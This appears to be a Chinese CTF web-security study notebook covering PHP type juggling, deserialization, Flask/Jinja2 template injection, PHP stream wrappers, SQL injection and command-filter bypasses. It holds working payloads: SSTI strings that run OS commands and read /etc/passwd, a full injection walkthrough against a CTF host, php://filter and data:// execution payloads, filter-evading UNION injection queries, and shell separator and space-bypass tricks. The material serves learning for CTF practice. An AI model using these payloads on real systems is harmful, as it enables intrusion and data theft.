# Web Notes

### robots.txt

**robots.txt**是一种存放于**网站根目录下**的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称**爬虫**），此网站中的哪些内容是**不应被搜索引擎的漫游器获取的**，哪些是**可以被漫游器获取**的。

这个协议也不是一个规范，而只是**约定俗成**的，有些搜索引擎会遵守这一规范，有些则不然。

### Google 用户代理令牌(User-agent)

| 抓取工具                                                     | 用户代理令牌（产品令牌）                                     | 完整的用户代理字符串                                         |
| :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| **[APIs-Google](https://support.google.com/webmasters/answer/7426684)** | `APIs-Google`                                                | `APIs-Google (+https://developers.google.com/webmasters/APIs-Google.html)` |
| **[AdSense](https://support.google.com/adsense/answer/99376)** | `Mediapartners-Google`                                       | `Mediapartners-Google`                                       |
| [**AdsBot Mobile Web Android**](https://support.google.com/google-ads/answer/2404197)（检查 Android 网页广告质量） | `AdsBot-Google-Mobile`                                       | `Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)` |
| [**AdsBot Mobile Web**](https://support.google.com/google-ads/answer/2404197)（检查 iPhone 网页广告质量） | `AdsBot-Google-Mobile`                                       | `Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)` |
| **[AdsBot](https://support.google.com/google-ads/answer/2404197)**（检查桌面设备网页广告质量） | `AdsBot-Google`                                              | `AdsBot-Google (+http://www.google.com/adsbot.html`)         |
| **[Googlebot Image](https://support.google.com/webmasters/answer/35308)** | `Googlebot-Image``Googlebot`                                 | `Googlebot-Image/1.0`                                        |
| **[Googlebot News](https://support.google.com/news/publisher-center/answer/9606634)** | `Googlebot-News``Googlebot`                                  | `Googlebot-News`                                             |
| **Googlebot Video**                                          | `Googlebot-Video``Googlebot`                                 | `Googlebot-Video/1.0`                                        |
| **[Googlebot](https://support.google.com/webmasters/answer/182072)**（桌面版） | `Googlebot`                                                  | `Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html`) `Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/W.X.Y.Z‡ Safari/537.36`  或（很少使用）：  `Googlebot/2.1 (+http://www.google.com/bot.html`) |
| **[Googlebot](https://support.google.com/webmasters/answer/182072)**（智能手机版） | `Googlebot`                                                  | `Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/*W.X.Y.Z*‡ Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)` |
| **[Mobile AdSense](https://support.google.com/adsense/answer/99376)** | `Mediapartners-Google`                                       | （各类移动设备）(`compatible; Mediapartners-Google/2.1`; `+http://www.google.com/bot.html`) |
| [**Mobile Apps Android**](https://support.google.com/google-ads/answer/2404197)（检查 Android 应用页面广告质量。遵守 AdsBot-Google 漫游器规则。） | `AdsBot-Google-Mobile-Apps`                                  | `AdsBot-Google-Mobile-Apps`                                  |
| **[Feedfetcher](https://support.google.com/webmasters/answer/178852)** | `FeedFetcher-Google`不遵循 robots.txt 规则 - [查看原因](https://support.google.com/webmasters/answer/178852#robots) | `FeedFetcher-Google; (+http://www.google.com/feedfetcher.html)` |
| **[Google Read Aloud](https://support.google.com/webmasters/answer/9274005)** | `Google-Read-Aloud`不遵循 robots.txt 规则 - [查看原因](https://support.google.com/webmasters/answer/9274005#robots) | 现用代理： `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.118 Safari/537.36 (compatible; Google-Read-Aloud; +https://support.google.com/webmasters/answer/1061943)`曾用代理（已弃用）： `google-speakr` |
| **[Duplex on the Web](https://support.google.com/webmasters/answer/9467408)** | `DuplexWeb-Google`可能会忽略 * 用户代理通配符 - [查看原因](https://support.google.com/webmasters/answer/9467408#control-crawling) | `Mozilla/5.0 (Linux; Android 8.0; Pixel 2 Build/OPD3.170816.012; DuplexWeb-Google/1.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.131 Mobile Safari/537.36` |
| **Google Favicon**（检索各种服务的网站元素）                 | `Google Favicon`对于用户发起的请求，会忽略 robots.txt 规则   | `Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon` |
| **[Web Light](https://support.google.com/webmasters/answer/6211428)** | `googleweblight`不遵循 robots.txt 规则 - [查看原因](https://support.google.com/webmasters/answer/6211428#robots) | `Mozilla/5.0 (Linux; Android 4.2.1; en-us; Nexus 5 Build/JOP40D) AppleWebKit/535.19 (KHTML, like Gecko; googleweblight) Chrome/38.0.1025.166 Mobile Safari/535.19` |

### View-source

显示指定资源的源代码，在右键无法用的时候可以在url的最前面输入`view-source:`来查看网页源代码。

### php弱类型

===会先比较两个变量的类型是否相同，在比较数值

==在比较的时候，会将两个变量转换为相同的类型，再比较

```
如果比较一个数字和字符串或者比较涉及到数字内容的字符串，则字符串会被转换成数值并且比较按照数值来进行
```

hash比较缺陷

```php
"0e132456789"=="0e7124511451155" //true
"0e123456abc"=="0e1dddada"  //false
"0e1abc"=="0"     //true
```

**在进行比较运算时，如果遇到了0e\d+这种字符串，就会将这种字符串解析为科学计数法。如果不满足0e\d+这种模式，就会当作字符串进行比较，所以不会相等。**

十六进制转换

```php
"0x1e240"=="123456"     //true
"0x1e240"==123456       //true
"0x1e240"=="1e240"      //false
```

当其中的一个字符串是0x开头的时候，PHP会将此字符串解析成为十进制然后再进行比较。

类型转换

```php
<?php
$test=1 + "10.5"; // $test=11.5(float)
$test=1+"-1.3e3"; //$test=-1299(float)
$test=1+"bob-1.3e3";//$test=1(int)
$test=1+"2admin";//$test=3(int)
$test=1+"admin2";//$test=1(int)
?>
```

PHP手册：**当一个字符串欸当作一个数值来取值，其结果和类型如下:如果该字符串没有包含`'.','e','E'`并且其数值值在整形的范围之内该字符串被当作int来取值，其他所有情况下都被作为float来取值，该字符串的开始部分决定了它的值，如果该字符串以合法的数值开始，则使用该数值，否则其值为0。**

md5()

```php
$array1[] = array("foo" => "bar", "bar" => "foo",);
$array2 = array("foo", "bar", "hello", "world");

var_dump(md5($array1)==var_dump($array2));  //true
```

PHP手册中的md5()函数的描述是`string md5 ( string $str [, bool $raw_output = false ] )`，md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，并且返回`NULL`。这样就会导致任意2个array的md5值都会相等。



### Referer请求头

`Referer` 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。

在以下两种情况下，`Referer` 不会被发送：

- 来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI；
- 当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。

### X-Forwarded-For

**X-Forwarded-For**:简称**XFF头**，它代表客户端，也就是HTTP的请求端**真实的IP**，只有在通过了HTTP 代理或者负载均衡服务器时才会添加该项。它不是RFC中定义的标准请求头信息，在squid缓存代理服务器开发文档中可以找到该项的详细介绍。

> 标准格式如下：
>
> X-Forwarded-For: client1, proxy1, proxy2
>
> 从标准格式可以看出，X-Forwarded-For头信息可以有多个，中间用逗号分隔，第一项为真实的客户端ip，剩下的就是曾经经过的代理或负载均衡的ip地址，经过几个就会出现几个。

如果一个 HTTP 请求到达服务器之前，经过了三个代理 Proxy1、Proxy2、Proxy3，IP 分别为 IP1、IP2、IP3，用户真实 IP 为 IP0，那么按照 XFF 标准，服务端最终会收到以下信息：

X-Forwarded-For: IP0, IP1, IP2

Proxy3 直连服务器，它会给 XFF 追加 IP2，表示它是在帮 Proxy2 转发请求。列表中并没有 IP3，IP3 可以在服务端通过 Remote Address 字段获得。我们知道 HTTP 连接基于 TCP 连接，HTTP 协议中没有 IP 的概念，Remote Address 来自 TCP 连接，表示与服务端建立 TCP 连接的设备 IP，在这个例子里就是 IP3。

Remote Address 无法伪造，因为建立 TCP 连接需要三次握手，如果伪造了源 IP，无法建立 TCP 连接，更不会有后面的 HTTP 请求。不同语言获取 Remote Address 的方式不一样，例如 php 是 $_SERVER["REMOTE_ADDR"]，Node.js 是 req.connection.remoteAddress，但原理都一样。

### Referer

`Referer` 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等

### 序列化

所有php里面的值都可以使用函数`serialize()`来返回一个包含**字节流的字符串来表示**。

`unserialize()`函数能够**重新把字符串变回php原来的值**。

 序列化一个对象将会**保存对象的所有变量**，但是**不会保存对象的方法**，只会保存类的名字。

为了能够`unserialize()`一个对象，**这个对象的类必须已经定义过**。如果序列化类A的一个对象，将会返回一个跟类A相关，而且包含了对象所有变量值的字符串。 如果要想在另外一个文件中解序列化一个对象，这个对象的类必须在解序列化之前定义，可以通过包含一个定义该类的文件或使用函数`spl_autoload_register()`来实现。

**__sleep()**

serialize() 函数会检查类中是否存在一个魔术方法 __sleep()。如果存在，该方法会先被调用，然后才执行序列化操作。此功能可以用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组。如果该方法未返回任何内容，则 NULL 被序列化，并产生一个 E_NOTICE 级别的错误。

对象被序列化之前触发，返回需要被序列化存储的成员属性，删除不必要的属性。

**__wakeup()**

unserialize() 会检查是否存在一个 \__wakeup() 方法。如果存在，则会先调用 __wakeup 方法，预先准备对象需要的资源。

预先准备对象资源，返回void，常用于反序列化操作中重新建立数据库连接或执行其他初始化操作。

~~~php
a - array
b - boolean
d - double
i - integer
o - common object
r - reference
s - string
C - custom object
O - class
N - null
R - pointer reference
U - unicode string
~~~

* CVE-2016-7124漏洞，当序列化字符串中**表示对象属性个数的值**大于**真实的属性个数时**会跳过__wakeup的执行

~~~php
<?php
	class Student{
		private $name = "casuall";
		private $age = 18;
		public function __wakeup(){
			echo "wakeup is called";
			echo "<br/>";
		}
	}

	$a = new Student;
	$ser = serialize($a);
	echo $ser . "<br/>";

	$unser = unserialize($ser);

	// output:
	// O:7:"Student":2:{s:13:"Studentname";s:7:"casuall";s:12:"Studentage";i:18;}
  // wakeup is called
  // 其中:2:中的2表示对象属性个数，其余的遵循 “类型：长度：值” 的格式
?>
~~~

### 模版注入(SSTI)

flask模块的渲染方法有render_template和render_template_string两种。

render_template()是用来渲染一个指定的文件的

~~~python
return render_tmplate('index.html')
~~~

Render_template_string用来渲染一个字符串，SSTI与这个方法有关系。

~~~python
html = '<h1>This is index page</h1>'
return render_template_string(html)
~~~

flask是使用Jinja2来作为渲染引擎的。

在网站的根目录下新建`templates`文件夹，这里是用来存放html文件，也就是模板文件。

模板文件并不是单纯的html代码，而是夹杂着模板的语法，因为页面不可能都是一个样子的，有一些地方是会变化的。比如说显示用户名的地方，这个时候就需要使用模板支持的语法，来传参。

`{{}}`在Jinja2中作为变量包裹标识符，不仅可以传递变量，还可以执行一些简单的表达式。

不正确的使用flask中的`render_template_string`方法会引发SSTI。

python的几个魔术方法

* `__class__`  python中的新式类（即显示继承object对象的类）都有一个属性 `__class__` 用于获取当前实例对应的类，例如 `"".__class__` 就可以获取到字符串实例对应的类
* `__mro__`    python中类对象的 __mro__ 属性会返回一个tuple对象，其中包含了当前类对象所有继承的基类，tuple中元素的顺序是MRO（Method Resolution Order） 寻找的顺序
* `__base__`   返回该对象所继承的基类
  // __base__和__mro__都是用来寻找基类的
* `__subclasses__`   python的新式类都保留了它所有的子类的引用，`__subclasses__()` 这个方法返回了类的所有存活的子类的引用（是类对象引用，不是实例）。
* `__init__`  类的初始化方法
* `__globals__`  保存了函数所有的所有全局变量，在利用中，可以使用 `__init__` 获取对象的函数，并通过 `__globals__` 获取 file、os 等模块以进行下一步的利用

**测试用例**

Flask/Jinja2

- `{{ config }}`
- `{{ config.items() }}`
- `{{get_flashed_messages.__globals__['current_app'].config}}`
- `{{''.__class__.__mro__[-1].__subclasses__()}}`
- `{{ url_for.__globals__['__builtins__'].__import__('os').system('ls') }}`
- `{{ request.__init__.__globals__['__builtins__'].open('/etc/passwd').read() }}`

**常见payload**

- `().__class__.__bases__[0].__subclasses__()[40](r'/etc/passwd').read()`
- `().__class__.__bases__[0].__subclasses__()[59].__init__.func_globals.values()[13]['eval']('__import__("os").popen("ls /").read()' )`

**预防**

将传入可控参数的地方加上变量包裹符`{{}}`，即可防止表达式执行。

~~~python
@app.route('/test/')
def test():
    code = request.args.get('id')
    return render_template_string('<h1>{{ code }}</h1>',code=code)
~~~

以一个题为例，题目来自于攻防世界的Web_python_template_injection

~~~php
http://220.249.52.133:52133/{{7*7}}
# 返回下面的结果，可以看到7*7被执行了
# URL http://220.249.52.133:52133/49 not found

http://220.249.52.133:52133/{{''.__class__}}
# ''.__class__ 返回空字符串的类型
# URL http://220.249.52.133:52133/<type 'str'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__}}
# 返回了当前类和继承的基类，这里我们选择object类
# URL http://220.249.52.133:52133/(<type 'str'>, <type 'basestring'>, <type 'object'>) not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2]}}
# URL http://220.249.52.133:52133/<type 'object'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__}}
# 提示我们__subclasses__是一个内置方法，所以需要加括号执行
# URL http://220.249.52.133:52133/<built-in method __subclasses__ of type object at 0x8f8740> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()}}
# object的子类太多，就不列举了，我们找到了file
# URL http://220.249.52.133:52133/[<type 'type'>, <type 'weakref'>, <type 'weakcallableproxy'>, <type 'weakproxy'>, <type 'int'>, <type 'basestring'>, <type 'bytearray'>, <type 'list'>, <type 'NoneType'>, <type 'NotImplementedType'>...] not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71]}}
# URL http://220.249.52.133:52133/<class 'site._Printer'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__}}
# URL http://220.249.52.133:52133/{'traceback': <module 'traceback' from '/usr/lib/python2.7/traceback.pyc'>, 'setencoding': <function setencoding at 0x7fabe2ab3410>, 'sethelper': <function sethelper at 0x7fabe2ab3230>, 'execsitecustomize': <function execsitecustomize at 0x7fabe2ab3488>...}

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os']}}
# URL http://220.249.52.133:52133/<module 'os' from '/usr/lib/python2.7/os.pyc'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].listdir('.')}}
# URL http://220.249.52.133:52133/['fl4g', 'index.py'] not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[40]}}
# URL http://220.249.52.133:52133/<type 'file'> not found

http://220.249.52.133:52133/{{''.__class__.__mro__[2].__subclasses__()[40]('./fl4g').read()}}
# URL http://220.249.52.133:52133/ctf{f22b6844-5169-4054-b2a0-d95b9361cb57} not found

~~~

### php伪协议

php:// — 访问各个输入/输出流（I/O streams）

* **php://input** 是个可以访问请求的原始数据的只读流.CTF中经常使用`file_get_contents`获取`php://input`内容(POST)，需要开启`allow_url_include`，并且当`enctype="multipart/form-data"`的时候 **php://input是无效**的。

  * **利用方式：**`?file=php://input` 数据利用`POST`传过去

  * 碰到**file_get_contents()**就要想到用**php://input**绕过，因为php伪协议也是可以利用http协议的，即可以使用POST方式传数据。

    ~~~php
    ?user=php://input&file=php://filter/convert.base64-encode/resource=class.php
    ?user=php://input&file=php://filter/convert.base64-encode/resource=index.php
    ?user=php://input&file=class.php&pass=O:4:%22Read%22:1:{s:4:%22file%22;s:8:%22f1a9.php%22;}
    ~~~

    

* **php://output** 是一个只写的数据流， 允许你以print和 echo 一样的方式 写入到输出缓冲区。

* **php://filter** 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器

  **php://filter 参数**

  ~~~
  resource=<要过滤的数据流>  这个参数是必须的。它指定了你要筛选过滤的数据流。
  read=<读链的筛选列表> 该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔
  write=<写链的筛选列表>	该参数可选。可以设定一个或多个过滤器名称，以管道符（`|`）分隔。
  <；两个链的筛选列表> 任何没有以 `read=` 或 `write=` 作前缀 的筛选器列表会视情况应用于读或写链。
  ~~~

  

  ~~~
  # 字符串过滤器
  string.rot13
  进行rot13转换
  
  string.toupper
  将字符全部大写
  
  string.tolower
  将字符全部小写
  
  string.strip_tags
  去除空字符、HTML 和 PHP 标记后的结果。
  功能类似于strip_tags()函数，若不想某些字符不被消除，后面跟上字符，可利用字符串或是数组两种方式。
  
  # 转换过滤器
  
  convert.base64-encode和 convert.base64-decode使用这两个过滤器等同于分别用 base64_encode()和 base64_decode()函数处理所有的流数据。 convert.base64-encode支持以一个关联数组给出的参数。如果给出了 line-length，base64 输出将被用 line-length个字符为 长度而截成块。如果给出了 line-break-chars，每块将被用给出的字符隔开。这些参数的效果和用 base64_encode()再加上 chunk_split()相同
  
  convert.quoted-printable-encode和 convert.quoted-printable-decode使用此过滤器的 decode 版本等同于用 quoted_printable_decode()函数处理所有的流数据。没有和 convert.quoted-printable-encode相对应的函数。 convert.quoted-printable-encode支持以一个关联数组给出的参数。除了支持和 convert.base64-encode一样的附加参数外， convert.quoted-printable-encode还支持布尔参数 binary和 force-encode-first。 convert.base64-decode只支持 line-break-chars参数作为从编码载荷中剥离的类型提示。
  
  ~~~

  以下命令常用来读取文件

  ~~~php
  ?file=php://filter/read=convert.base64-encode/resource=index.php
  ~~~

* **data://**

  php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码

  用法：

  `data://text/plain;base64,`

  `<?php system("dir")?>` base64编码后使用

  `http://localhost/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b`(注意编码后的+号要URL编码)

### php中大小写敏感规则

* 区分大小写的：变量名、常量名、数组索引
* 不区分大小写的：函数名、方法名、类名、魔术常量、NULL、TRUE、FALSE、强制类型转换

### SQL注入

手工注入步骤：

1.判断是否存在注入，注入是字符型还是数字型

2.猜解SQL查询语句中的字段数

3.确定显示的字段顺序

4.获取当前数据库

5.获取数据库中的表

6.获取表中的字段名

7.下载数据



GROUP_CONCAT()函数将组中的字符串连接成为具有各种选项的单个字符串。

MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中，要求字段数一致。

~~~sql
注入常见参数 
user()：当前数据库用户
database()：当前数据库名
version()：当前使用的数据库版本
@@datadir：数据库存储数据路径
concat()：联合数据，用于联合两条数据结果。如 concat(username,password)
group_concat()：和 concat() 类似，如 group_concat(DISTINCT+user,password)，用于把多条数据一次注入出来
concat_ws()：用法类似
hex() 和 unhex()：用于 hex 编码解码
load_file()：以文本方式读取文件，在 Windows 中，路径设置为 \\
select xxoo into outfile '路径'：权限较高时可直接写文件

行间注释 
'-- '   --后面有个空格
DROP sampletable;--
url里空格会被浏览器直接处理掉，就到不了数据库里。所以特意用加号代替。
#
DROP sampletable;#
~~~



~~~sql
?id=1'  回显空白 -> 可能为单引号闭合
?id=1'--+ 回显正常 -> 单引号闭合方式
?id=1' and 1=1--+ 回显空白 -> 可能过滤了and
?id=1' And 1=1--+ 回显空白 -> 可能过滤了大小写
?id=1' anandd 1=1--+ 回显正常 -> 嵌套剥离绕过 过滤了and、or
?id=1' oorrder by 3--+ ->列数为3

?id=-1' uniunionon selselectect 1,group_concat(schema_name),3 from infoorrmation_schema.schemata--+
?id=-1' uniunionon selecselectt 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema='web18'--+
?id=-1' uniunionon selecselectt 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='flag'--+
?id=-1' uniunionon selecselectt 1,flag,3 from flag--+


?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='web18'--+
?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'--+
?id=-1' union select 1,flag,3 from flag--+
~~~

### vim备份文件

**临时文件 file.swp**

非正常关闭vim编辑器（直接关闭终端、电脑断电等），都会生成一个用于备份缓冲区内容的**临时文件**——`.swp`文件。它记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。并且**多次意外退出并不会覆盖旧的.swp文件**，而是会生成一个新的，例如.swo文件。

**备份文件file~**

默认情况下，**备份文件**的名称是在原始文件名最后加上“~”后缀。例如，正在编辑一个名为“data.txt”的文件，那么Vim将产生名为“data.txt~”的备份文件。

### php探针

php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。

一个比较常见的探针是**雅黑PHP探针**，默认地址是**tz.php**。

### php短标签

在php的配置文件php.ini中有一个`short_open_tag`的值，开启以后可以使用PHP的短标签：`<? ?>`。同时，只有开启这个才可以使用 `<?=` 以代替 `<? echo`。不过**在php7中这个标签被移除了**。

### 命令执行绕过

**通配符**

`?`：匹配任何**一个**字符，需要知道文件名的长度

```bash
$ cat f???
flag{123}
```

`*`：匹配全部字符

```bash
$ cat *
flag{123}
```

`[]`：一个范围

```bash
[abc]  // 匹配abc之中的任意一个字符
[a-z]  // 匹配a到z中的任意一个字符
$ cat fl[a-c]g
flag{123}
```

`{..}`：生产序列，以逗号分隔，且不能有空格

```bash
$ touch {a..d}
$ ls 
a b c d

$ touch{1,2}
$ ls
1 2

$ {cat,flag}
flag{123}

$ echo {{A..Z},{a..z}}
A B C D E F G H I J K L M N O P Q R S T U V W X Y Z a b c d e f g h i j k l m n o p q r s t u v w x y z
```

`{...}`与`[...]`有一个很重要的区别。如果匹配的文件不存在，`[...]`会失去模式的功能，变成一个单纯的字符串，而`{...}`依然可以展开。

```bash
$ ls [ab].txt
ls: [ab].txt: No such file or directory

$ ls {a,b}.txt
ls: a.txt: No such file or directory
ls: b.txt: No such file or directory
```

**命令分隔于执行多条命令**

Unix

```bash
%0a
%0d
;
&
|
$(shell_command)`shell_command`{shell_command,}
```

Windows

```bash
%0a
&
|
%1a - 一个神奇的角色，作为.bat文件中的命令分隔符
```

**空格过滤**

`${IFS}`：IFS是internal field separator的缩写，shell的特殊环境变量

```bash
$ cat${IFS}flag
flag{123}

$ cat$IFS$9flag  （使$IFS被当成一个整体，cat$IFSflag会把$IFSflag当成一个变量）
flag{123}
```

 

`<>file`：以读写模式打开文件（默认情况下在文件描述符0（stdin）上，如`<`），不会被截断，如果file不存在，则会创建文件。

```bash
$ cat<flag
flag{123}

$ cat<>flag #需要写权限
flag{123}
```

